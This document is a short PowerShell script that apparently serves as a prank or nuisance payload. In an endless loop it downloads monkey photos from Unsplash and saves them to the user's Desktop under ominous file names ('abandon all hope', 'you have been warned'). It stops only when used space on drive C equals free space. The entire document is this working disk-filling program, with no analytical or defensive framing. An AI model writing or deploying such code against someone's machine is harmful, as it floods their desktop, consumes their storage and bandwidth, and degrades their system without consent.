# Define array of monkey names with scrambled order
$mn = @("Harambe", "George", "King", "Kong", "Ape","zilla") | Get-Random -Count 4 | Sort-Object { Get-Random }

# Define array of warning messages with scrambled order
$sm = @("do", "not", "open", "click", "with", "caution", "heed", "this", "warning", "proceed with caution","enter at your own risk", "abandon all hope", "you", "have", "been", "warned", "all", "is", "lost") | Get-Random -Count 8 | Sort-Object { Get-Random }

while ($true) {
    $monkeyName = Get-Random $mn
    $imageUrl = "https://source.unsplash.com/800x600/?$monkeyName,monkey"

    $webClient = New-Object System.Net.WebClient
    $imageData = $webClient.DownloadData($imageUrl)

    # Add random warning message to end of file name
    $randomMessage = Get-Random $sm
    $fileName = "$env:userprofile\Desktop\$monkeyName-$randomMessage.jpg"
    [System.IO.File]::WriteAllBytes($fileName, $imageData)

    $drive = Get-PSDrive C
    if ($drive.Used -ge $drive.Free) { break }
}
